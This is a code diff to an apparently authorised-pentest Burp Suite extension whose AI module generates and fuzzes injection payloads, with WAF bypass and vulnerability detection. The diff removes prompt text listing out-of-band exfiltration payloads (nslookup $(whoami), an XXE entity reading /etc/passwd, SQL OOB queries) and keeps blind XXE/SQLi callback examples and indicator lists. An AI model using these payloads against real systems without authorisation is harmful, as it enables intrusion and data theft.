@@ -8,6 +8,7 @@ import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.params.HttpParameterType;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.JsonScanSupport;
 import com.omnistrike.framework.PayloadEncoder;
 import com.omnistrike.framework.PersistenceManager;
 import com.omnistrike.model.*;
@@ -293,7 +294,7 @@ public class AiVulnAnalyzer implements ScanModule {
                     + "- Payloads with any other attack_type will be AUTOMATICALLY DISCARDED.\n"
                     + "- Do NOT include XSS, SQLi, or other unrelated payloads even if you see potential for them.\n\n"
                     + "Respond ONLY with valid JSON:\n"
-                    + "{\"payloads\": [{\"parameter\": \"param_name\", \"injection_point\": \"query|body|header|cookie|xml\", "
+                    + "{\"payloads\": [{\"parameter\": \"param_name_or_json_pointer\", \"injection_point\": \"query|body|json|header|cookie|xml\", "
                     + "\"payload\": \"the_actual_payload_string\", \"attack_type\": \"" + attackType + "\", "
                     + "\"description\": \"brief explanation\"}]}\n\n"
                     + "HTTP Request:\n";
@@ -324,22 +325,17 @@ public class AiVulnAnalyzer implements ScanModule {
         if (serverAddr == null || serverAddr.isEmpty()) {
             return "";
         }
-        // Improvement 5: Collaborator-aware payload chaining with data exfiltration
+        // OOB confirmation uses fixed canaries only; target-derived callback data
+        // would bypass the outbound AI redaction boundary.
         return "OUT-OF-BAND (OOB) TESTING: You have access to a Burp Collaborator server at: " + serverAddr + "\n"
                 + "For any blind/OOB payloads (blind SQLi, blind XXE, blind SSRF, blind command injection, etc.), "
                 + "use the literal placeholder {COLLAB} wherever you need a unique Collaborator subdomain.\n"
                 + "Example: For blind XXE, use <!ENTITY xxe SYSTEM \"http://{COLLAB}\">\n"
                 + "Example: For blind SSRF, use http://{COLLAB}/test\n"
                 + "Example: For blind SQLi DNS exfil, use LOAD_FILE('\\\\\\\\{COLLAB}\\\\a')\n"
-                + "The {COLLAB} placeholder will be automatically replaced with a real tracked Collaborator URL.\n\n"
-                + "DATA EXFILTRATION via Collaborator:\n"
-                + "When generating OOB/blind payloads, embed data exfiltration in the Collaborator subdomain:\n"
-                + "- Command Injection: nslookup $(whoami).{COLLAB} or nslookup $(cat /etc/hostname | base32 | tr -d =).{COLLAB}\n"
-                + "- SQL OOB (MySQL): SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{COLLAB}\\\\\\\\a'))\n"
-                + "- SQL OOB (MSSQL): exec master..xp_dirtree '\\\\\\\\' + db_name() + '.{COLLAB}\\\\a'\n"
-                + "- SQL OOB (Oracle): SELECT UTL_HTTP.REQUEST('http://'||user||'.{COLLAB}') FROM DUAL\n"
-                + "- XXE OOB: <!ENTITY % exfil SYSTEM 'http://{COLLAB}/?data=file:///etc/passwd'>\n"
-                + "This turns binary OOB confirmation into data extraction. The exfiltrated data appears as a subdomain in the Collaborator interaction.\n\n";
+                + "The {COLLAB} placeholder will be automatically replaced with a real tracked Collaborator URL.\n"
+                + "PRIVACY RULE: use only fixed canary labels and paths. Never embed database values, "
+                + "file contents, usernames, hostnames, tokens, or other target-derived data in an OOB request.\n\n";
     }
 
     private static String getAttackType(String moduleId) {
@@ -691,6 +687,12 @@ public class AiVulnAnalyzer implements ScanModule {
 
             logInfo("Smart Fuzzing: Testing " + payloads.size() + " payloads against " + exchange.getUrl());
 
+            String baselineBody = "";
+            if (originalReqResp.response() != null) {
+                String originalBody = originalReqResp.response().bodyToString();
+                if (originalBody != null) baselineBody = originalBody;
+            }
+
             // Step 2: Send each payload and collect results
             List<FuzzResult> allResults = new ArrayList<>();
             for (FuzzPayload payload : payloads) {
@@ -722,7 +724,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     allResults.add(result);
 
                     // Check for immediate vulnerability indicators
-                    boolean vulnFound = checkForVulnIndicators(result, exchange.getUrl(), targetModuleId);
+                    boolean vulnFound = checkForVulnIndicators(
+                            result, exchange.getUrl(), targetModuleId, baselineBody);
 
                     // Improvement 12: Record this payload in fuzz history
                     recordTestedPayload(exchange.getUrl(), resolvedPayload, response,
@@ -732,7 +735,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     if (wafBypass && wafDetected && !cancelled) {
                         logInfo("Smart Fuzzing: WAF detected for payload [" + resolvedPayload.attackType + "], attempting bypass");
                         List<FuzzResult> bypassResults = performWafBypass(
-                                originalReqResp.request(), resolvedPayload, response, targetModuleId);
+                                originalReqResp.request(), resolvedPayload, response,
+                                targetModuleId, baselineBody);
                         allResults.addAll(bypassResults);
                     }
                 } catch (Exception e) {
@@ -754,7 +758,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     if (!waitForRateLimit(exchange.getUrl())) break;
 
                     List<FuzzResult> adaptiveResults = performAdaptiveRound(
-                            originalReqResp.request(), allResults, round, targetModuleId);
+                            originalReqResp.request(), allResults, round,
+                            targetModuleId, baselineBody);
                     if (adaptiveResults.isEmpty()) break;
                     allResults.addAll(adaptiveResults);
 
@@ -813,7 +818,8 @@ public class AiVulnAnalyzer implements ScanModule {
     private List<FuzzResult> performWafBypass(HttpRequest originalRequest,
                                                FuzzPayload blockedPayload,
                                                HttpRequestResponse wafResponse,
-                                               String targetModuleId) {
+                                               String targetModuleId,
+                                               String baselineBody) {
         List<FuzzResult> results = new ArrayList<>();
         if (cancelled) return results;
         try {
@@ -860,7 +866,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     boolean vulnFound = false;
                     if (!stillBlocked) {
                         logInfo("WAF Bypass: Successfully bypassed with [" + bypass.technique + "]");
-                        vulnFound = checkForVulnIndicators(result, originalRequest.url(), targetModuleId);
+                        vulnFound = checkForVulnIndicators(
+                                result, originalRequest.url(), targetModuleId, baselineBody);
                     }
 
                     // Improvement 12: Record WAF bypass payloads in fuzz history
@@ -882,7 +889,8 @@ public class AiVulnAnalyzer implements ScanModule {
     private List<FuzzResult> performAdaptiveRound(HttpRequest originalRequest,
                                                     List<FuzzResult> previousResults,
                                                     int round,
-                                                    String targetModuleId) {
+                                                    String targetModuleId,
+                                                    String baselineBody) {
         List<FuzzResult> results = new ArrayList<>();
         if (cancelled) return results;
         try {
@@ -938,7 +946,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     boolean wafDetected = isWafBlocked(response);
                     FuzzResult result = new FuzzResult(resolved, response, wafDetected, elapsed);
                     results.add(result);
-                    boolean vulnFound = checkForVulnIndicators(result, originalRequest.url(), targetModuleId);
+                    boolean vulnFound = checkForVulnIndicators(
+                            result, originalRequest.url(), targetModuleId, baselineBody);
 
                     // Improvement 12: Record adaptive payloads in fuzz history
                     recordTestedPayload(originalRequest.url(), resolved, response,
@@ -960,21 +969,25 @@ public class AiVulnAnalyzer implements ScanModule {
      * Checks a single fuzz result for common vulnerability indicators
      * (error messages, reflection, time delays) and reports immediately.
      */
-    private boolean checkForVulnIndicators(FuzzResult result, String url, String targetModuleId) {
+    private boolean checkForVulnIndicators(FuzzResult result, String url, String targetModuleId,
+                                            String baselineBody) {
         if (result.response == null || result.response.response() == null) return false;
 
         String body = result.response.response().bodyToString();
         if (body == null) return false;
-        String bodyLower = body.toLowerCase();
+        String payloadText = result.payload.payload == null ? "" : result.payload.payload;
+        String evidenceBody = payloadText.isEmpty() ? body : body.replace(payloadText, "");
+        String bodyLower = evidenceBody.toLowerCase(Locale.ROOT);
+        String baselineLower = baselineBody == null ? "" : baselineBody.toLowerCase(Locale.ROOT);
         int status = result.response.response().statusCode();
 
         // SQL error indicators
         if (result.payload.attackType.equals("sqli")) {
-            for (String indicator : List.of("sql syntax", "mysql", "postgresql", "oracle",
-                    "sqlite", "unclosed quotation", "unterminated string",
-                    "you have an error in your sql", "warning: mysql", "pg_query",
-                    "odbc", "jdbc", "sqlexception", "syntax error at or near")) {
-                if (bodyLower.contains(indicator)) {
+            for (String indicator : List.of("you have an error in your sql", "sqlstate[",
+                    "warning: mysql_", "pg_query", "ora-", "unclosed quotation mark",
+                    "quoted string not properly terminated", "unterminated quoted string at or near",
+                    "syntax error at or near", "sqliteexception", "sqlexception")) {
+                if (bodyLower.contains(indicator) && !baselineLower.contains(indicator)) {
                     reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
                             "SQL Injection — database error triggered",
                             "Database error '" + indicator + "' found in response after injecting: "
@@ -996,13 +1009,21 @@ public class AiVulnAnalyzer implements ScanModule {
             }
         }
 
-        // XSS reflection — only check if the actual injected payload is reflected verbatim
+        // Reflection alone is not executable XSS. Require an HTML response and an
+        // active payload, then keep the result tentative pending browser-context review.
         if (result.payload.attackType.equals("xss")) {
-            if (body.contains(result.payload.payload)) {
-                reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
-                        "Reflected XSS — payload reflected unescaped in response",
+            String contentType = responseContentType(result.response);
+            String payloadLower = payloadText.toLowerCase(Locale.ROOT);
+            boolean activePayload = payloadLower.contains("<script") || payloadLower.contains("<svg")
+                    || payloadLower.contains("<img") || payloadLower.contains("onerror")
+                    || payloadLower.contains("onload") || payloadLower.contains("javascript:");
+            if (contentType.contains("text/html") && activePayload
+                    && !payloadText.isEmpty() && body.contains(payloadText)
+                    && (baselineBody == null || !baselineBody.contains(payloadText))) {
+                reportFuzzFinding(result, url, targetModuleId, Severity.MEDIUM, Confidence.TENTATIVE,
+                        "Possible Reflected XSS — active payload reflected in HTML",
                         "Injected payload reflected verbatim in response body: "
-                                + truncate(result.payload.payload, 200));
+                                + truncate(payloadText, 200));
                 return true;
             }
         }
@@ -1011,7 +1032,7 @@ public class AiVulnAnalyzer implements ScanModule {
         if (result.payload.attackType.equals("cmdi")) {
             for (String indicator : List.of("root:x:0:0:", "uid=0(root)", "uid=",
                     "volume serial number", "/bin/bash", "/bin/sh")) {
-                if (bodyLower.contains(indicator)) {
+                if (bodyLower.contains(indicator) && !baselineLower.contains(indicator)) {
                     reportFuzzFinding(result, url, targetModuleId, Severity.CRITICAL, Confidence.FIRM,
                             "Command Injection — OS command output detected",
                             "OS-level output '" + indicator + "' detected after injecting: "
@@ -1043,7 +1064,8 @@ public class AiVulnAnalyzer implements ScanModule {
                     "3571*661", "2360431"
             );
             for (var entry : mathCanaries.entrySet()) {
-                if (result.payload.payload.contains(entry.getKey()) && body.contains(entry.getValue())) {
+                if (payloadText.contains(entry.getKey()) && evidenceBody.contains(entry.getValue())
+                        && (baselineBody == null || !baselineBody.contains(entry.getValue()))) {
                     reportFuzzFinding(result, url, targetModuleId, Severity.CRITICAL, Confidence.FIRM,
                             "Server-Side Template Injection — math expression evaluated",
                             "Template expression '" + entry.getKey() + "' evaluated to '"
@@ -1058,7 +1080,7 @@ public class AiVulnAnalyzer implements ScanModule {
         if (result.payload.attackType.equals("path_traversal")) {
             for (String indicator : List.of("root:x:0:0:", "[boot loader]",
                     "[extensions]", "[fonts]", "PATH=", "HOME=")) {
-                if (bodyLower.contains(indicator) && status == 200) {
+                if (bodyLower.contains(indicator) && !baselineLower.contains(indicator) && status == 200) {
                     reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
                             "Path Traversal — file content leaked",
                             "File content indicator '" + indicator + "' found after injecting: "
@@ -1072,7 +1094,8 @@ public class AiVulnAnalyzer implements ScanModule {
         if (result.payload.attackType.equals("ssrf")) {
             for (String indicator : List.of("ami-", "instance-id", "metadata",
                     "169.254.169.254", "127.0.0.1", "localhost")) {
-                if (bodyLower.contains(indicator) && !result.wafDetected) {
+                if (bodyLower.contains(indicator) && !baselineLower.contains(indicator)
+                        && !result.wafDetected) {
                     reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.TENTATIVE,
                             "Possible SSRF — internal resource indicator in response",
                             "Internal indicator '" + indicator + "' found after injecting: "
@@ -1083,6 +1106,16 @@ public class AiVulnAnalyzer implements ScanModule {
         }
 
         return false;
+    }
+
+    private static String responseContentType(HttpRequestResponse response) {
+        if (response == null || response.response() == null) return "";
+        for (var header : response.response().headers()) {
+            if (header.name().equalsIgnoreCase("Content-Type")) {
+                return header.value() == null ? "" : header.value().toLowerCase(Locale.ROOT);
+            }
+        }
+        return "";
     }
 
     /**
@@ -1239,7 +1272,8 @@ public class AiVulnAnalyzer implements ScanModule {
 
             // Replace only the first occurrence per iteration
             resolvedPayload = resolvedPayload.replaceFirst(
-                    java.util.regex.Pattern.quote(COLLAB_PLACEHOLDER), collabPayload);
+                    java.util.regex.Pattern.quote(COLLAB_PLACEHOLDER),
+                    java.util.regex.Matcher.quoteReplacement(collabPayload));
         }
 
         return new FuzzPayload(payload.parameter, payload.injectionPoint,
@@ -1249,58 +1283,71 @@ public class AiVulnAnalyzer implements ScanModule {
     // ==================== Request modification ====================
 
     private HttpRequest injectPayload(HttpRequest original, FuzzPayload payload) {
-        return switch (payload.injectionPoint.toLowerCase()) {
+        String injectionPoint = payload.injectionPoint == null ? "" : payload.injectionPoint.toLowerCase(Locale.ROOT);
+        return switch (injectionPoint) {
             case "query", "url" -> original.withParameter(
                     HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.URL));
-            case "body" -> original.withParameter(
-                    HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.BODY));
+            case "body" -> {
+                if (isJsonRequest(original)) {
+                    String originalBody = original.bodyToString();
+                    String modifiedBody = injectJsonValue(originalBody, payload.parameter, payload.payload);
+                    yield modifiedBody.equals(originalBody) ? original : original.withBody(modifiedBody);
+                }
+                yield original.withParameter(
+                        HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.BODY));
+            }
+            case "json" -> {
+                String originalBody = original.bodyToString();
+                String modifiedBody = injectJsonValue(originalBody, payload.parameter, payload.payload);
+                yield modifiedBody.equals(originalBody) ? original : original.withBody(modifiedBody);
+            }
+            // "xml" explicitly means a complete replacement document. This avoids
+            // accidentally appending an XML payload as a URL parameter.
+            case "xml" -> original.withBody(payload.payload);
             case "header" -> original
                     .withRemovedHeader(payload.parameter)
                     .withAddedHeader(payload.parameter, payload.payload);
-            case "cookie" -> {
-                // Replace only the target cookie, preserving all other cookies (session, CSRF, etc.)
-                String existingCookies = "";
-                for (var h : original.headers()) {
-                    if ("Cookie".equalsIgnoreCase(h.name())) {
-                        existingCookies = h.value();
-                        break;
-                    }
-                }
-                String newCookies = replaceCookieValue(existingCookies, payload.parameter, payload.payload);
-                yield original.withRemovedHeader("Cookie").withAddedHeader("Cookie", newCookies);
-            }
+            case "cookie" -> PayloadEncoder.injectCookie(
+                    original, payload.parameter, payload.payload);
             default -> original.withParameter(
                     HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.URL));
         };
     }
 
-    /**
-     * Replaces a single cookie's value in a cookie header string, preserving all other cookies.
-     * If the target cookie doesn't exist, appends it.
-     */
-    private static String replaceCookieValue(String cookieHeader, String name, String newValue) {
-        if (cookieHeader == null || cookieHeader.isEmpty()) {
-            return name + "=" + newValue;
-        }
-        StringBuilder result = new StringBuilder();
-        boolean replaced = false;
-        for (String pair : cookieHeader.split(";")) {
-            String trimmed = pair.trim();
-            if (result.length() > 0) result.append("; ");
-            int eq = trimmed.indexOf('=');
-            String cookieName = eq > 0 ? trimmed.substring(0, eq).trim() : trimmed.trim();
-            if (cookieName.equalsIgnoreCase(name)) {
-                result.append(name).append("=").append(newValue);
-                replaced = true;
-            } else {
-                result.append(trimmed);
+    private static boolean isJsonRequest(HttpRequest request) {
+        for (var header : request.headers()) {
+            if ("Content-Type".equalsIgnoreCase(header.name())) {
+                String value = header.value().toLowerCase(Locale.ROOT);
+                return value.contains("application/json") || value.contains("+json");
             }
         }
-        if (!replaced) {
-            if (result.length() > 0) result.append("; ");
-            result.append(name).append("=").append(newValue);
+        return false;
+    }
+
+    /**
+     * Structurally replaces one JSON primitive. JSON Pointer is preferred; a
+     * display/leaf name is accepted only when it identifies exactly one target.
+     */
+    static String injectJsonValue(String body, String requestedParameter, String payload) {
+        if (body == null || requestedParameter == null || requestedParameter.isBlank()) return body;
+        try {
+            List<JsonScanSupport.Target> targets = JsonScanSupport.extractTargets(body);
+            String requested = requestedParameter.trim();
+
+            for (JsonScanSupport.Target target : targets) {
+                if (target.identityName().equals(requested)) {
+                    return JsonScanSupport.replaceValue(body, target.path(), payload);
+                }
+            }
+
+            List<JsonScanSupport.Target> matches = targets.stream()
+                    .filter(target -> target.matchesParameterName(requested))
+                    .toList();
+            if (matches.size() != 1) return body;
+            return JsonScanSupport.replaceValue(body, matches.get(0).path(), payload);
+        } catch (RuntimeException ignored) {
+            return body;
         }
-        return result.toString();
     }
 
     // ==================== WAF Detection ====================
@@ -1397,6 +1444,7 @@ public class AiVulnAnalyzer implements ScanModule {
         }
 
         wafFingerprints.put(host, fp);
+        com.omnistrike.framework.BoundedDeduplication.trimToSize(wafFingerprints, 10_000);
         logInfo("WAF Fingerprint: " + host + " — waf=" + fp.wafDetected
                 + " passed=" + fp.passedProbes.size() + " blocked=" + fp.blockedProbes.size());
         return fp;
@@ -1504,6 +1552,7 @@ public class AiVulnAnalyzer implements ScanModule {
     private boolean waitForRateLimit(String url) {
         String host = extractHost(url);
         RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());
+        com.omnistrike.framework.BoundedDeduplication.trimToSize(rateLimitTrackers, 10_000);
 
         if (tracker.ipBlocked) {
             logInfo("Rate Limit: IP blocked for " + host + " — halting AI scan");
@@ -1537,6 +1586,7 @@ public class AiVulnAnalyzer implements ScanModule {
         if (response == null || response.response() == null) return;
         String host = extractHost(url);
         RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());
+        com.omnistrike.framework.BoundedDeduplication.trimToSize(rateLimitTrackers, 10_000);
 
         int status = response.response().statusCode();
         String body = response.response().bodyToString();
@@ -3332,5 +3382,14 @@ public class AiVulnAnalyzer implements ScanModule {
     public void destroy() {
         if (llmExecutor != null) llmExecutor.shutdownNow();
         if (fuzzExecutor != null) fuzzExecutor.shutdownNow();
+        llmClient.clearSensitiveConfiguration();
+        analyzed.clear();
+        batchQueue.clear();
+        wafFingerprints.clear();
+        rateLimitTrackers.clear();
+        fuzzHistory.clear();
+        sessionFindings.clear();
+        batchScanRunning = false;
+        connectionMode = AiConnectionMode.NONE;
     }
 }
